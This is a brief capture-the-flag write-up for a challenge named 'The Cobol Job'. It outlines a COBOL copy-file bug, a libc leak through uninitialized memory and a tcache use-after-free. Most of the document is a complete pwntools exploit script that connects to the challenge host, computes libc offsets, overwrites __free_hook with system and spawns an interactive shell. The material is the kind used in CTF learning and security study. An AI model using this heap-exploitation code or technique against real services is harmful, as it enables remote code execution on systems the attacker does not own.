The Cobol Job
=============

1. bug in stdlib of cobol in copy file functionality
2. leak libc through uninitialized mem (could've leaked through proc maps but why not)
3. uaf in tcache to free hook

```py
from pwn import *


#r = remote("172.17.0.2",4444)
r = remote("cobol.pwni.ng", 3083)

def do_uaf(source,dest):
    r.sendlineafter(">","6")
    r.sendlineafter(":",source)
    r.sendlineafter(":",dest)

def do_open(path,index,buf_sz):
    r.sendlineafter(">","2")
    r.sendlineafter(":",path)
    r.sendlineafter(":",str(index))
    r.sendlineafter(":",str(buf_sz))

def do_create(path,index,buf_sz):
    r.sendlineafter(">","1")
    r.sendlineafter(":",path)
    r.sendlineafter(":",str(index))
    r.sendlineafter(":",str(buf_sz))


def do_read(index):
    r.sendlineafter(">","3")
    r.sendlineafter(":",str(index))
    # parse data


def do_write(index,data):
    r.sendlineafter(">","4")
    r.sendlineafter(":",str(index))
    r.sendlineafter(":",data)
    r.sendlineafter(")","n") # dont continue reading


def do_close(index):
    r.sendlineafter(">","5")
    r.sendlineafter(":",str(index))


#do_create("test1234",1,0x80)
#do_write(1, "A" * 0x8)

# big infoleak



do_create("leakkk",1,0x8)
do_write(1,"A"*7)

do_open("leakkk",2,0x420)
do_close(2) # get ptrs in chunk
do_open("leakkk",2,0x420)
do_read(2)


tmp = r.recvuntil("-----------------------")
print(tmp)

offset = 10

libc_leak  = u64(tmp[offset:offset+8])
libc_base = libc_leak - 0x3ebca0

log.success("libc leak @ "+hex(libc_leak))
log.success("libc base @ "+hex(libc_base))

malloc_hook = libc_base + 0x3ebc30
free_hook   = libc_base + 0x3ed8e8

log.success("free hook @ "+hex(free_hook))

# uaf 
uaf_size = 0x30
uaf_name = "A" * uaf_size


do_create(uaf_name,3,8)
#do_write(3,"A"*8)
do_write(3,p64(free_hook))

do_uaf(uaf_name,"uaf")

# allocate
#pause()
do_create("tmp1",4,uaf_size)
#pause()
do_open("tmp1",5,uaf_size) # over hook

system = libc_base + 0x4f550
do_write(5,p64(system))


do_write(1,"sh")
do_close(1)



r.interactive()
```
